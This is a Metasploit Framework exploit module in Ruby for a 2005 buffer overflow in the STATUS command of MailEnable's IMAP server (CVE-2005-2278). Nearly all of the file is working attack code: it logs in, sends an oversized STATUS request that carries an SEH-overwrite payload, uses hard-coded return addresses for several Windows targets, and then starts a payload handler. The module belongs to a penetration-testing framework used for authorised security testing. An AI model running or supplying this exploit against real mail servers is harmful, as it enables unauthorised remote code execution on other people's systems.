##
# $Id: mailenable_status.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Imap
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MailEnable IMAPD (1.54) STATUS Request Buffer Overflow',
			'Description'    => %q{
					MailEnable's IMAP server contains a buffer overflow
				vulnerability in the STATUS command. With proper
				credentials, this could allow for the execution of arbitrary
				code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2005-2278'],
					[ 'OSVDB', '17844'],
					[ 'BID', '14243'],
					[ 'NSS', '19193'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 450,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['MailEnable 1.54 Pro Universal',  { 'Rets' =>  [9273, 0x1001c019] }], #MEAISP.DLL
					['Windows XP Pro SP0/SP1 English', { 'Rets' =>  [9273, 0x71aa32ad] }],
					['Windows 2000 Pro English ALL',   { 'Rets' =>  [9273, 0x75022ac4] }],
					['Windows 2003 Server English',    { 'Rets' =>  [9273, 0x7ffc0638] }],
				],
			'DisclosureDate' => 'Jul 13 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect_login

		seh = generate_seh_payload(target['Rets'][1])
		buf = rand_text_alphanumeric(target['Rets'][0])
		req = "a001 STATUS \".\x00" + buf + seh
		req << "\" (UIDNEXT UIDVALIDITY MESSAGES UNSEEN RECENT)\r\n"
		sock.put(req)

		handler
		disconnect
	end

end